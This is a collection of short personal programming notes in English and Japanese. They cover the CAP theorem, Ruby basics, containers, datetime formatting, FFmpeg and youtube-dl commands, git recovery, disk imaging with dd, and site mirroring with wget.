date: 2021-12-19T15:14
---

CAP theorem
===========

Also named Brewer's theorem after computer scientist Eric Brewer, the
CAP theorem states that in the presence of a **network partition**, you
must choose between **consistency** and **availability**.

It is a common problem faced by [[microservices]].


===

<!-- Source: computing/software/cd-dvd-iso.md -->
<!-- URL: /computing/software/cd-dvd-iso -->
<!-- Title: CD/DVD から ISO を生成する方法 -->
<!-- Wikilinks: [[computing/software/cd-dvd-iso]], [[software/cd-dvd-iso]], [[cd-dvd-iso]] -->

---
date: 2020-08-10
tags:
  - command
---

# CD/DVD から ISO を生成する方法

東北の鳴子温泉でこけしを買いに行った際、なんとローカルの NHK
に取材された。放送時は残念ながら東北にいなかったので、代わりに担当者に DVD
を送ってもらった。

今や DVD ドライブ標準搭載のパソコンはなかなかないし、 DVD
の劣化を恐れてパソコンに [ISO
としてコピーする方法を調べた](https://superuser.com/q/85987)。

下記コマンドは Mac Book Pro で叩いたが、 UNIX 系なら使えるでしょう。

まず DVD をドライブに入れる。

```sh
# ディスク名を確認する
diskutil list

# 該当ディスクを取り外してから ISO を生成する
sudo umount /dev/disk2
dd if=/dev/disk2 of=mydisk.iso

# 終わったら物理的に取り外す
drutil eject 1
```

最後のコマンドは、我が MacBook Pro
みたいな古い端末で物理的なボタンを押下してもなかなかディスクを取り外してくれない
ときに使うコマンド。


===

<!-- Source: computing/software/cloning-pages-with-wget.md -->
<!-- URL: /computing/software/cloning-pages-with-wget -->
<!-- Title: Cloning Pages with wget -->
<!-- Wikilinks: [[computing/software/cloning-pages-with-wget]], [[software/cloning-pages-with-wget]], [[cloning-pages-with-wget]] -->

---
date: '2023-04-28T16:46:35+0900'
---

# Cloning Pages with `wget`

``` {.sh}
wget -mk -nH
```

-   `-m` turns on all options for mirroring (recursion, time stamping...)
-   `-k` convert link in the local document to make them suitable for local viewing
-   `-nH` useful to clone the site in the current folder without creating an additional folder

[Source](https://my.ine.com/INE/courses/630a470a/web-application-penetration-testing-extreme)


===

<!-- Source: computing/software/closure.md -->
<!-- URL: /computing/software/closure -->
<!-- Title: Closure -->
<!-- Wikilinks: [[computing/software/closure]], [[software/closure]], [[closure]] -->

---
date: 2021-06-09T09:33
---

# Closure

**Closure** is the concept of saving a piece of code and execute it at a
later time. The term comes from the fact it build an "enclosure" around the
surrounding artifacts (variables, methods, objets etc).

When the closure is later executed, it can reference the artifacts it
binded.

A useful mental image is to think of closure as non explicitly named method
that is passed around and executed.

## Closures in Ruby

In Ruby, closures are implemented through a `Proc` object, a lambda, or a
block.


===

<!-- Source: computing/software/collaborator-objects.md -->
<!-- URL: /computing/software/collaborator-objects -->
<!-- Title: Collaborator Objects -->
<!-- Wikilinks: [[computing/software/collaborator-objects]], [[software/collaborator-objects]], [[collaborator-objects]] -->

---
date: 2021-06-04T09:40
---

# Collaborator Objects

Collaboration is one way of modeling relationship between different objets.
In a collaboration, there is a _has-a_ type of relationship reffered to as
_association_ (see [[inheritance-vs-association]]#). Collaborator objects
can be of any time.

```ruby
class Library
  def initialize
    @book = []
  end

  def add_book(book)
    @books << book
  end
end

class Book
end

my_library = Library.new
my_book = Book.new
my_library.add_book(my_book)
```

In the code above, there is a _collaborative relationship_ between
`Library` and `Book` classes within the class definition of `Library`.
However, `my_book` doesn't become associated with `my_library` until the
last line when we call the `Library#add_book` method.

In general, collaboration is view in terms of modeling relationships, i.e.
even if we never call `Library#add_book` (and thus never associate
`my_book` with `my_library`), it is safe to say `Book` class is a
collaborator for `Library` because of the design decision in our code.


===

<!-- Source: computing/software/collection-methods.md -->
<!-- URL: /computing/software/collection-methods -->
<!-- Title: Common Collection Methods -->
<!-- Wikilinks: [[computing/software/collection-methods]], [[software/collection-methods]], [[collection-methods]] -->

# Common Collection Methods

## each

One uses the `#each` method when in need to yield a reference to each element
in the collection.

```ruby
arr = [1, 2, 3, 4]

arr.each do |num|
  puts num
end
```

On `line 3-5` we are calling the `each` method on the array assigned to local
variable `arr`, passing in the `do..end` block as an argument. The block is
executed once for each element in the collection it is called on, passing that
element as a parameter. Afterwards, the `each` method returns the collection
itself.

Sometimes, one needs to use the element as well as the current element
numerical index. For this, there is the `#each_with_index` method.

```ruby
arr = [1, 2, 3, 4]

arr.each_with_index do |num, index|
  puts "#{index}: #{num}"
end
```

{.ui .message .info}
Note that `#each` returns the collection it's called upon, as-is.

## map

Like `#each`, the `#map` method iterates over a collection and apply a
block to each element of it. The difference is it also **returns** a new array
with the results of each block.

Refer to the irb session below to see the difference in the return value of bo
th methods.

```irb
irb :001 > arr = [1, 2, 3, 4]
irb :002 > arr.each { |num| num + 1 }
=> [1, 2, 3, 4]
irb :003 > arr.map { |num| num + 1 }
=> [2, 3, 4, 5]
```

On `line 3`, we are calling the `map` method on an array assigned to local
variable `arr`, passing in the `{}` block as an argument. The block is
executed once for each element in the collection, passing that element as a
parameter. Afterwards, the `map` method returns a new array containing the
return value of each block.

`#each` returns the collection it's called upon, as we saw earlier, while
`#map` returns a new array with the results of each block.

{.ui .message .info}
`#map` as an alias called `#collect`.

## select

Like `#each`, the `#select` method iterates over a collection and returns a new
collection, however it doesn't populate this new collection with the results of
each block. Rather it _select_ results of each block if they return `true`
to the provided expression.

```irb
irb :001 > arr = [1, 2, 3, 4]
irb :002 > arr.select { |num| num < 3 }
=> [1, 2]
```

On `line 2` we are calling the `select` method on the array assigned to local
variable `arr`, passing in the `{}` block as an argument. The block is
executed once for every element of the collection, passing in that element as a
parameter. Afterwards, the `select` method returns a new collection of element
for which the return value of the `{}` block evaluates to true.

On this example, the expression returns true for the first two elements (`1`
and `2`); `#select` returns them in a new array.



===

<!-- Source: computing/software/containers-primer.md -->
<!-- URL: /computing/software/containers-primer -->
<!-- Title: Containers: a Primer -->
<!-- Wikilinks: [[computing/software/containers-primer]], [[software/containers-primer]], [[containers-primer]] -->

---
date: 2021-12-26T15:43
---

Containers: a Primer
====================

At a high level, a container is a *slice of an operating system* running
on a server (or personal computer) which runs an app. By preference one
app per container.

Containers are generally smaller and more efficient than running a whole
OS running on a virtual machine on top of a hypervisor. This is why apps
in containers should start promptly.

Apps running in a containers are called *containerized apps*.

Famous container technologies include [[docker]]# and [[kubernetes]]#.


===

<!-- Source: computing/software/control-character.md -->
<!-- URL: /computing/software/control-character -->
<!-- Title: Control Character -->
<!-- Wikilinks: [[computing/software/control-character]], [[software/control-character]], [[control-character]] -->

---
date: 2020-08-01
---

# Control Character

In order to stop having to look them up each time:

<table class="ui celled table">
  <thead>
    <tr>
      <th>ASCII</th>
      <th>Control Character</th>
      <th>Name</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td data-label="ASCII">9</td>
      <td data-label="Control Character">\t</td>
      <td data-label="Name">Horizontal Tab</td>
    </tr>
    <tr>
      <td data-label="ASCII">10</td>
      <td data-label="Control Character">\n</td>
      <td data-label="Name">Line Feed</td>
    </tr>
    <tr>
      <td data-label="ASCII">11</td>
      <td data-label="Control Character">\v</td>
      <td data-label="Name">Vertical Tab</td>
    </tr>
    <tr>
      <td data-label="ASCII">12</td>
      <td data-label="Control Character">\f</td>
      <td data-label="Name">Form Feed</td>
    </tr>
    <tr>
      <td data-label="ASCII">13</td>
      <td data-label="Control Character">\r</td>
      <td data-label="Name">Carriage Return</td>
    </tr>
  </tbody>
</table>


===

<!-- Source: computing/software/dates-to-test.md -->
<!-- URL: /computing/software/dates-to-test -->
<!-- Title: Dates to Test in your Program -->
<!-- Wikilinks: [[computing/software/dates-to-test]], [[software/dates-to-test]], [[dates-to-test]] -->

---
date: 2022-04-29T14:10
---

Dates to Test in your Program
=============================

In programming there are several "problematic" dates. They are
problematic mainly because people forget to test for them.

-   **1970-01-01**: start of time (Unix time)
-   **2025**: (Only in Japan) Showa 100 on older system
-   **2036-02-07 06:28:16 UTC**: Network Time Protocol roll over
    (integer overflow)
-   **2038-01-19**: Unix time roll over
-   **2038-11-20 or 21**: GPS week number rollover
-   **2106-02-07 06:28:15**: Roll over of date saved with `time_t` in
    hexadecimal format

Testing for bundary value (a bit before and a bit after) is also a must.
Specially for people not on UTC timezone.


===

<!-- Source: computing/software/datetime-timezone-formatting-iso-and-rfc.md -->
<!-- URL: /computing/software/datetime-timezone-formatting-iso-and-rfc -->
<!-- Title: Datetime, Time Zone Formatting, ISO and RFC -->
<!-- Wikilinks: [[computing/software/datetime-timezone-formatting-iso-and-rfc]], [[software/datetime-timezone-formatting-iso-and-rfc]], [[datetime-timezone-formatting-iso-and-rfc]] -->

---
date: '2023-04-29T10:46:22+0900'
---

# Datetime, Time Zone Formatting, ISO and RFC

It's a well known fact that date and time are an absolute pain in
software engineering.

Instead of reinventing the wheel, following the convention is probably
the safest way there. For Date and Time on the Internet, that would
probably be the [RFC 3339](https://www.ietf.org/rfc/rfc3339.txt).

This RFC defines (quote):

> \[...\] a date and time format for use in Internet
> protocols that is a profile of the ISO 8601 standard for
> representation of dates and times using the Gregorian calendar.

The datetime format in ISO 8601 is represented as follows (the `date`
command has a nice formatting flag for that):

``` {.sh}
❯ date --iso-8601=seconds
2023-04-29T10:55:38+09:00
```

Alright, then how does RFC 3339 format it (once again, useful `date`
flag)?

``` {.sh}
❯ date --rfc-3339=seconds
2023-04-29 10:55:38+09:00
```

The only difference is the presence or absence of "T" between the two
format. This is actually defined in *5.6. Internet Date/Time Format*:

>      NOTE: ISO 8601 defines date and time separated by "T".
>      Applications using this syntax may choose, for the sake of
>      readability, to specify a full-date and full-time separated by
>      (say) a space character.

The important and often misunderstood-and-leading-to-problem bit is
about **time zone**

## Time Zone in DateTime Format

Let's take the example from the RFC: `1996-12-20 00:39:57Z`.

A developer uninformed about the concept of time zone in datetime format
may assume that this date is 39 minutes and 57 seconds at midnight of
December 20th, 1996 in their timezone (JST for me).

**Wrong.** "Z" here stands for Zulu timezone (nautical time zone, GMT).
It is the same as UTC+0. The equivalent in JST would be:
`1996-12-20 09:39:57`.

There is, however, a problem with this notation: we are loosing the
information about timezone. The proper notation would be:
`1996-12-20 09:39:57+09:00`.

In security especially, but in all of software engineering in general,
this is important because without correct handling of time zones,
and because requests can come from all over the world, it becomes hard
to parse log correctly and to try to understand, for example, how to
attribute an attack correctly and understand its different steps.

## Takeaways

-   If you are storing a date, it should be in UTC+0 (`Z`), always:
    `1996-12-20 00:39:57Z`
-   If the date is shown to the user, it should be converted to their
    timezone: `1996-12-20 09:39:57+09:00`[^1]
-   Use `T` between date and time if you want to, or if your app need to
    follow ISO 8601.

::: {.highlight-block}
The date an time on these notes are not following the advice above,
and are saved on current timezone time. There may be a way to make that
a bit better but it may not be worth the effort for me.
:::

[Source](https://medium.easyread.co/understanding-about-rfc-3339-for-datetime-formatting-in-software-engineering-940aa5d5f68a)

[^1]: It is probably best to do the
    conversion client-side so as to make sure to not get confused about
    current datetime during flow execution


===

<!-- Source: computing/software/difference-between-boolean-values-truthy-falsey.md -->
<!-- URL: /computing/software/difference-between-boolean-values-truthy-falsey -->
<!-- Title: Difference Between Boolean Values and Truthy/Falsey -->
<!-- Wikilinks: [[computing/software/difference-between-boolean-values-truthy-falsey]], [[software/difference-between-boolean-values-truthy-falsey]], [[difference-between-boolean-values-truthy-falsey]] -->

---
date: 2020-09-23T22:31
---

# Difference Between Boolean Values and Truthy/Falsey

What are considered falsey values is different in various programming language.

In Ruby, falsey values are `false` and `nil`.

In JavaScript, there are more that two: `false`, `0`, `-0`, `0n`, `""`, `null`,
`undefined`, and `NaN`.

On the other hand, language like Java (so-called "strongly typed" language)
don't have truthy and falsey. `true` evaluates to true, `false` evaluates to
false and everything else used in a Boolean context will cause the compiler or
interpreter to yell at you.

This is why the distinction between Boolean values and truthy/falsey is
important: there is nothing inherent that makes `nil` or `0` a falsey. It's a
design choice by the programming language creators and maintainers (although it
would be surprising if a language considered 42 a falsey).



===

<!-- Source: computing/software/divisions-integer.md -->
<!-- URL: /computing/software/divisions-integer -->
<!-- Title: Divisions with Integer -->
<!-- Wikilinks: [[computing/software/divisions-integer]], [[software/divisions-integer]], [[divisions-integer]] -->

---
date: 2020-08-20
---

# Divisions with Integer

A pretty common error but I still got burn by it, therefore a note is
warranted.

In most programming language, like Ruby, divising Integers will result in an
Integer, whether the result is just or not.

It is quite obvious with small operation:

```ruby
5 / 3 # => 1
```

But the real danger lies in bigger operation, or operation part of another
operation.

I recently fall in this trap when trying to [[convert-decimal-degrees]].

Let's take the following code where I use a common formula to convert degrees
to degrees, minutes, seconds:

```ruby
DEG = "\xC2\xB0"
MIN_PER_DEG = 60
SEC_PER_MIN = 60
SEC_PER_DEG = MIN_PER_DEG * SEC_PER_MIN

def dms(dd)
  d = dd.to_i                                   # => 76
  m = ((dd - d) * MIN_PER_DEG).to_i             # => 43
  s = (dd - d - m / SEC_PER_MIN) * SEC_PER_DEG  # => 2628?!

  format(%(%d#{DEG}%02d'%02d"), d, m, s)        # => "76°43'2628\""
end

dms(76.73) == %(76°43'48")                      # => false
```

An honnest mistake but a common one. For this code to run properly, we need to
do the calculation with floats; converting `m` to a float is enough here:

```ruby
def dms(dd)
  d = dd.to_i                                        # => 76
  m = ((dd - d) * MIN_PER_DEG).to_i                  # => 43
  s = (dd - d - m.to_f / SEC_PER_MIN) * SEC_PER_DEG  # => 48.000000000014296

  format(%(%d#{DEG}%02d'%02d"), d, m, s)             # => "76°43'48\""
end

dms(76.73) == %(76°43'48")                           # => true
```


===

<!-- Source: computing/software/docker.md -->
<!-- URL: /computing/software/docker -->
<!-- Title: Docker -->
<!-- Wikilinks: [[computing/software/docker]], [[software/docker]], [[docker]] -->

---
date: 2021-12-26T16:01
---

Docker
======

The name Docker comes from a British colloquialism that's a conjunction
of *dock* and work*er* (somebody who works in a dock or a shipping
port). You put the two together, get rid of the *work* and you get
Docker.

The Technology
--------------

Containers are like fast lightweight virtual machines, and Docker makes
running our apps inside of containers really easy.

Simply put, you just take your application code, and build it into an
image. You then use that image to spin up your app as containers. The
image can be saved in a registry somewhere.

That's it. It's simple.

However it is absolutely key to moving to a modern cloud native
microservices design.

The difficulty resides at doing it at **scale**. To do so we can use
[[kubernetes]]#.


===

<!-- Source: computing/software/download-music-youtube-dl.md -->
<!-- URL: /computing/software/download-music-youtube-dl -->
<!-- Title: Download Music with youtube-dl -->
<!-- Wikilinks: [[computing/software/download-music-youtube-dl]], [[software/download-music-youtube-dl]], [[download-music-youtube-dl]] -->

---
date: 2020-09-12T14:29
tags:
  - tips
---

# Download Music with youtube-dl

{.ui .warning .message}
Please do not use `youtube-dl` to download copyrighted contents. Support the
author/musician/artist.


There are some good mix on YouTube, SoundClound and MixCloud. Unfortunately it's
difficult to listen to them offline. When the artist doesn't respond to my
query, I use youtube-dl to download the mix.

```bash
youtube-dl --format bestaudio --extract-audio    \
           --audio-format best --audio-quality 0 \
           --embed-thumbnail --add-metadata      \
           "URL"
```

**Notes:**

* `youtube-dl` already download the best available quality therefore no
  need to pass special options. However downloading the whole video to only
  use the audio track is a waste of energy, which is why `--format
  bestaudio` is set.
* `--extract-audio` still needs to be passed because the first option often
  download a video format with only an audio track which needs to be
  extracted/converted anyway.
* `--audio-format` is set to `best` by default and is most probably
  redundant
* `--audio-quality 0` is the most confusing option: it sets the audio
  quality for the convertion (0 = better, which is itself confusing).
  However, with `--audio-format` set at `best`, one could assume a
  "lossless" (although files are already lossy anyway) extraction is done.
  In that case no need for a convertion, and, therefore, no need to use
  this option. But if a convertion is done, this option defaults to `5`,
  resulting in a loss of quality. It is therefore set to `0` by precaution.
* `--embed-thumbnail` does not work with `.opus` (most YouTube videos)
* If using the `snap` version of `youtube-dl`, it seems to not be able to
  natively find `AtomicParsley` and therefore not beeing able to embed thumbnail

Knowing that, a simpler command can be used for audio only websites:

```bash
youtube-dl --format bestaudio               \
           --embed-thumbnail --add-metadata \
           "URL"
```


===

<!-- Source: computing/software/duck-typing.md -->
<!-- URL: /computing/software/duck-typing -->
<!-- Title: Duck Typing -->
<!-- Wikilinks: [[computing/software/duck-typing]], [[software/duck-typing]], [[duck-typing]] -->

---
date: 2021-06-02T13:36
---

# Duck Typing

Duck typing is another way to do polymorphism. Actually, duck typing _is_
polymorphic by definition. Duck typing describes the concept of creating
objects of arbitrary types that all respond to the same method call: _if it
quacks like a duck, walks like a duck, then it's probably a duck_.

The only thing we do care is whether _unrelated_ objects have a common
particular behavior (method).

Imagine a `website.rb` program that have different element that can respond
to a mouse click.

```ruby
# website.rb

class Checkbox
  def click
    # check/uncheck
  end
end

class Textbox
  def click
    # focus
  end
end

class RadioButton
  def click
    # select current option, unselect other
  end
end

class Link
  def click
    # open link
  end
end
```

From the point of view of a possible `mouse` or `pointer` object, the
object does not need to know if the element is a checkbox, a link or
something else. All elements have the ability to handle a click whether
they are a checkbox, link or else.

Like the idiom say, we don't need to check whether it is a duck. It's good
enough to know it quacks like a duck and walks like a duck ; as long as it
behaves like a duck, it's as good as a real duck.


===

<!-- Source: computing/software/email-with-plus.md -->
<!-- URL: /computing/software/email-with-plus -->
<!-- Title: + を使ったメールアドレス -->
<!-- Wikilinks: [[computing/software/email-with-plus]], [[software/email-with-plus]], [[email-with-plus]] -->

---
date: 2020-12-23T20:03
---

# + を使ったメールアドレス

どこでなに、いつ登録しているかを把握するため、かつ、漏洩したときにどこが漏洩したかを把握するため、登録しているメールアドレスの後ろにサイト名と登録日を入れること
がありますが、それを可能にするため + alias という技術を使っています。

しかし、一部のサイトは "+" を有効なメールアドレスの文字として扱ってもらえなくて、登録できません。

実際、 "+" は有効なメールアドレスの文字かどうかを調べたら、なんと 1982年[^1]から有効な文字としつ定まれています！

詳しくは [RFC822](https://tools.ietf.org/html/rfc822) のページ8と9を参照。

従って、 "+" を許していないサイトは間違っているということです。

Shaaaaaaaaaaaaame!


[^1]: "+" を無効化しているメールアドレスのフォームの開発者の誕生より前という可能性が十分にありますね。



===

<!-- Source: computing/software/evaluate-block.md -->
<!-- URL: /computing/software/evaluate-block -->
<!-- Title: Evaluate a Block -->
<!-- Wikilinks: [[computing/software/evaluate-block]], [[software/evaluate-block]], [[evaluate-block]] -->

---
date: 2020-08-09
tags:
  - programming
  - tips
---

# Evaluate a Block

Questions to ask oneself when evaluating a code:

* What is the type of action being performed (method call, block, conditional, etc..)?
* What is the object that action is being performed on?
* What is the side-effect of that action (e.g. output or destructive action)?
* What is the return value of that action?
* Is the return value used by whatever instigated the action?

## Example with a Table

<table class="ui celled table">
  <thead>
    <tr>
      <th>Line</th>
      <th>Action</th>
      <th>Object</th>
      <th>Side Effect</th>
      <th>Return Value</th>
      <th>Is Return Value Used?</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td data-label="Line">#</td>
      <td data-label="Action">method `foo` called</td>
      <td data-label="Object">Array</td>
      <td data-label="Side Effect">None</td>
      <td data-label="Return Value">`nil`</td>
      <td data-label="Is Return Value Used?">No</td>
    </tr>
  </tbody>
</table>


===

<!-- Source: computing/software/false-nil-truthiness.md -->
<!-- URL: /computing/software/false-nil-truthiness -->
<!-- Title: false vs nil and the Idea of “Truthiness” -->
<!-- Wikilinks: [[computing/software/false-nil-truthiness]], [[software/false-nil-truthiness]], [[false-nil-truthiness]] -->

---
date: 2020-09-23T22:26
---

# false vs nil and the Idea of "Truthiness"

## false vs nil

`false` is a Boolean value which evaluate to false in a condition.

`nil` represents the nothing. It shall not be confused with emptyness. `""` is
an empty string, but it is not nothing, therefore different from `nil`. `nil`
evaluates to false in a Boolean context.

`false` and `nil` are two different objects and their values are also
different; respectively false and nil. However, _in Ruby_, the value they
evaluate to in a Boolean context is false for both (see
[Truthiness](#truthiness) below for more information).


The reason there are `nil` and `false` and not just `false` is they serve
different purpose:

* `false` and `true` are used in Boolean expressions
* `nil` is the value returned when something went awry or when there's nothing
  to return (not even emptyness)


## Truthiness

In Ruby, every value except `false` and `nil` evaluates to true in a Boolean
context. Another way to say it is that every value except the two above are
"truthy". On the other hand, this also means that `false` and `nil` are
"falsey".

A common mistake made when first learning about truthiness is to think "well,
this is just like `true` and `false`!"

As the result of the comparison being done is often the same whether you use a
Boolean or truthiness, the distinction between the two may seems overzealous at
first, but there are good reasons to distinguish them ([[difference-between-boolean-values-truthy-falsey]]#).

When describing a piece of code including truthy or falsey, one must make
sure to say so and not make the common mistake of calling them just "true" or
"false", or even say they are equal to true or false.

However, one can say that a truthy or a falsey _evaluates_ to either `true` or
`false`.



===

<!-- Source: computing/software/ffmpeg-transcode-dts.md -->
<!-- URL: /computing/software/ffmpeg-transcode-dts -->
<!-- Title: Transcode DTS with FFmpeg -->
<!-- Wikilinks: [[computing/software/ffmpeg-transcode-dts]], [[software/ffmpeg-transcode-dts]], [[ffmpeg-transcode-dts]] -->

---
date: 2021-04-11T11:14
---

Transcode DTS with FFmpeg
=========================

Because of DTS licensing, several products cannot (legally) read DTS
audio track. I am sure it's a great format but I often need a reliable
way to listen to audio track, whatever the terminal I am using.

Fortunately, the great `ffmpeg` can convert DTS to another format.

AC3's patent expired in March 2017 and generally works everywhere,
making it a not so bad lossy choice.

``` sh
ffmpeg -i <input_video> \
    -map 0              \
    -acodec ac3         \
    -vcodec  copy       \
    -scodec copy        \
    <output_video>
```

:::{.highlight-block}
Flags:

-   `-i` input
-   `-map 0` select every streams
-   `-acodev` audio
-   `-vcodev` video
-   `-scodev` subtitle
:::

For a free, lossless choice, flac is a great choice (but even with
maximum compression level, the resulting file is often huge).

``` sh
ffmpeg -i <input_video>                \
    -map 0                             \
    -acodec flac -compression_level 10 \
    -vcodec  copy                      \
    -scodec copy                       \
    <output_video>
```

Free All The Videos!
--------------------

Using flac with ffv1 to free your videos is great, if you have enough
storage space:

``` sh
ffmpeg -i <input_video>                  \
    -map 0                               \
    -acodec   flac -compression_level 10 \
    -vcodec   ffv1 -level 3              \
    -threads  8                          \
    -coder    1                          \
    -slices   4                          \
    -scodec copy                         \
    <output_video>
```

For more information see
[here](https://trac.ffmpeg.org/wiki/Encode/FFV1).

See also [[flac-compression-levels-ffmpeg]].


===

<!-- Source: computing/software/firefox-developer-tools.md -->
<!-- URL: /computing/software/firefox-developer-tools -->
<!-- Title: Firefox Developer Tools -->
<!-- Wikilinks: [[computing/software/firefox-developer-tools]], [[software/firefox-developer-tools]], [[firefox-developer-tools]] -->

---
date: 2021-11-16T22:05
---

Firefox Developer Tools
=======================

Developer Tools tricks and tips to remember.

Hide a Node
-----------

After selecting a node using the **Inspector** tool, one can easily hide
and unhide it using the `h` key.

Firefox will add `class="__fx-devtools-hide-shortcut__"` to the element,
making it hidden. Pressing the `h` key again will show the node again.

Reference Currently Selected Node with `$0`
-------------------------------------------

When a node is inspected, it can be referenced in the **Console** with
the variable `$0`. The Console Drawer itself can be opened using the
`Escape` key.

{.ui .info .message}
Firefox does not to the best of my knowledge indicate with a variable in
the Inspector tab that the node can be referenced, line Chromium-based
browser do with `== $0`.

Store as Global Variable
------------------------

An inspected node in the Inspector can be stored as a global variable by
right-clicking on it and selecting **Use in console**. It will show up
at `temp0` (with `0` incrementing) in the console.

Contrary to the reference used above with `$0`, `temp0` won't disappear
once a new node is selected in the Inspector.

Break on DOM Changes
--------------------

Right-click the element where to set the breakpoint in Inspector. After
selecting **Break on…**, select **Subtree modifications**, **Attribute
modifications**, or **Node removal**.

[More information.](https://developer.mozilla.org/en-US/docs/Tools)


===

<!-- Source: computing/software/fix-bag-merge-git.md -->
<!-- URL: /computing/software/fix-bag-merge-git -->
<!-- Title: Fix Bad Merge with Git -->
<!-- Wikilinks: [[computing/software/fix-bag-merge-git]], [[software/fix-bag-merge-git]], [[fix-bag-merge-git]] -->

---
date: 2020-08-29T12:39
tags:
  - git
---

# Fix Bad Merge with Git

There are several ways to fix bad merge with Git with varying degree of success
depending on what you try to achieve.


## Get Rid of Previous Commit (Hard Reset and Rebase)

In my case, I wanted to
[delete the previous commit](https://stackoverflow.com/a/23188613).


```sh
git reset --hard HEAD^

# Create a new branch at the commit you want to amend
git checkout -b temp_branch <commit_hash>

# Amend the commit
git rm <file>
git commit --amend --no-edit

# Rebase your previous branch onto this new commit, starting from the old-commit
git rebase --preserve-merges --onto temp_branch <old-commit> master

# Verify your changes
git diff master@{1}
```

## Undo Reset

This need to be done within a few days, before garbage collection kicks in
(generally monthly with `git` default setting).

```sh
# After using `git reset --hard HEAD^`
git reflog

# Find the SHA1 to restore in the list and use it
git reset --hard $SHA1
```


===

<!-- Source: computing/software/flac-compression-levels-ffmpeg.md -->
<!-- URL: /computing/software/flac-compression-levels-ffmpeg -->
<!-- Title: FLAC Compression Levels with FFmpeg -->
<!-- Wikilinks: [[computing/software/flac-compression-levels-ffmpeg]], [[software/flac-compression-levels-ffmpeg]], [[flac-compression-levels-ffmpeg]] -->

---
date: 2020-08-06
tags:
  - tips
---

# FLAC Compression Levels with FFmpeg

In order to convert music in the lossless FLAC format, we can use the `flac` command or the `ffmpeg` command.

One confusing thing is, the `flac` uses [libFLAC](https://xiph.org/flac/) while `ffmpeg`, to the best of my understanding, uses [Libav](https://libav.org/). The former has compression levels defined from 0 to 8.[^1] The latter has them set from 0 to 12.

The main difference is the way the encoder determines how many predictors to use. `ffmpeg` levels 8, 9 and 10 is roughly equivalent to the `-e` option of `flac`.

However, some caution must be taken with level 11 and 12. While there is nothing wrong with them, they increase the number of predictors form 12 to 32. That means better prediction of the signal but also slower decoding. The FLAC format permits this but an arbitrary limits of 12 predictors have been chosen by the developers. This is what we call the "FLAC subset". Above are "non-subset" and a lot of hardware players potentially won't be able to play files using this level.[^2]

As of this writing, for best compression and maximum compatibility settings, one needs to use the level 10 of `ffmpeg`:

```sh
ffmpeg -i input.wav -c:a flac -compression_level 10 output.flac
```

[Source](https://askubuntu.com/a/758299)


[^1]: Actually, levels are presets of various combination of "real" compression settings and have been arbitrarily set from 0 to 8 by the creators of FLAC. While not likely, this could change in the future.
[^2]: [FLAC compression levels 8 versus 12](https://hydrogenaud.io/index.php?topic=108100.0)


===

<!-- Source: computing/software/fork-repository-upstream.md -->
<!-- URL: /computing/software/fork-repository-upstream -->
<!-- Title: フォークしたリポジトリにアップストリームの更新を反映させる -->
<!-- Wikilinks: [[computing/software/fork-repository-upstream]], [[software/fork-repository-upstream]], [[fork-repository-upstream]] -->

---
date: 2020-08-06
tags:
  - tips
  - git
---

# フォークしたリポジトリにアップストリームの更新を反映させる

簡単だがすごい便利なコツ。

Github などでフォークしたリポジトリのアップストリームが更新されたら、その更新内容を自分のフォークにも反映させたいよね。

その時は `remote` に[アップストリームを追加する](https://docs.github.com/en/github/collaborating-with-issues-and-pull-requests/configuring-a-remote-for-a-fork)。

現状を確認する。
```
$ git remote -v
origin	git@github.com:USERNAME/FORK_NAME.git (fetch)
origin	git@github.com:USERNAME/FORK_NAME.git (push)
```

アップストリームを追加する。
```
$ git remote add upstream git@github.com:AUTHOR_NAME/UPSTREAM.git
```

もう一度確認する。
```
$ git remote -v
origin	git@github.com:USERNAME/FORK_NAME.git (fetch)
origin	git@github.com:USERNAME/FORK_NAME.git (push)
upstream	git@github.com:AUTHOR_NAME/UPSTREAM.git (fetch)
upstream	git@github.com:AUTHOR_NAME/UPSTREAM.git (push)

```

次は[同期する](https://help.github.com/en/github/collaborating-with-issues-and-pull-requests/syncing-a-fork)。
```
$ git fetch upstream
remote: Counting objects: 75, done.
remote: Compressing objects: 100% (53/53), done.
remote: Total 62 (delta 27), reused 44 (delta 9)
Unpacking objects: 100% (62/62), done.
From https://github.com/ORIGINAL_OWNER/ORIGINAL_REPOSITORY
 * [new branch]      master     -> upstream/master
```

```
$ git checkout master
Switched to branch 'master'
```

```
$ git merge upstream/master
```


## More Command

I just discovered [Oh Shit, Git!?!](https://ohshitgit.com/) which does a good
job at helping you unscrew your mistakes with Git.



===

<!-- Source: computing/software/heredoc.md -->
<!-- URL: /computing/software/heredoc -->
<!-- Title: Heredoc -->
<!-- Wikilinks: [[computing/software/heredoc]], [[software/heredoc]], [[heredoc]] -->

---
date: 2021-07-04T18:35
---

# Heredoc

A **here document** or **heredoc** is a section of source code file treated
as a separated file. It also refers to a way to form a multiline string
literals, preserving line breaks and other whitespace (including
indentation) in a text.

In Unix shells, heredoc are used to to output commands or text preserving
whitespaces:

```sh
$ cat << EOF > ./my_file.txt
heredoc> This file has multiple lines.
heredoc> It is in directory "$PWD".
heredoc> EOF
```

The command above uses heredoc to output two lines to a file called
`my_file.txt`. The command `"$PWD"` is expanded at execution.

`EOF` is used as the _delimiting identifier_. By convention it is often
`EOF` or `END`in all-uppercase but it can be anything, as long as the first
and last line use the same identifier.

```sh
$ cat my_file.txt
This file has multiple lines.
It is in directory "/home/user".
```

It is possible to _not_ expand commands by surrounding `EOL` with single
quotes: `<< 'EOF'`.

[More informations](https://en.wikipedia.org/wiki/Here_document)

See also [[heredoc-ruby]]#.


===

<!-- Source: computing/software/heroku.md -->
<!-- URL: /computing/software/heroku -->
<!-- Title: What is Heroku -->
<!-- Wikilinks: [[computing/software/heroku]], [[software/heroku]], [[heroku]] -->

---
date: 2020-08-21T22:44
---

# What is Heroku

Heroku is a cloud-based platform-as-a-service (PaaS). As a platform, it manages
container system for building, running and managing apps. It hide away the
burdon of server and infrastructure management and let developper concentrate
on writting/deploying apps.

In other word, it's kind of a "DevOps as a service"; for a developper, that
means being able to focus on writting code and not worry about build and
deployment.

[Heroku](https://www.heroku.com/)


===

<!-- Source: computing/software/html-css.md -->
<!-- URL: /computing/software/html-css -->
<!-- Title: HTML/CSS -->
<!-- Wikilinks: [[computing/software/html-css]], [[software/html-css]], [[html-css]] -->

---
date: 2021-11-04T21:57
---

HTML/CSS
========

Portals
-------

-   [[html-video-tag]]#
-   [[html-label-input-tag]]#
-   [[html-datalist-tag]]#
-   [[html-reset-type]]#
-   [[description-list-form]]#
-   [[css-attribute-selectors]]#
-   [[css-box-model]]#
-   [[css-box-sizing]]#
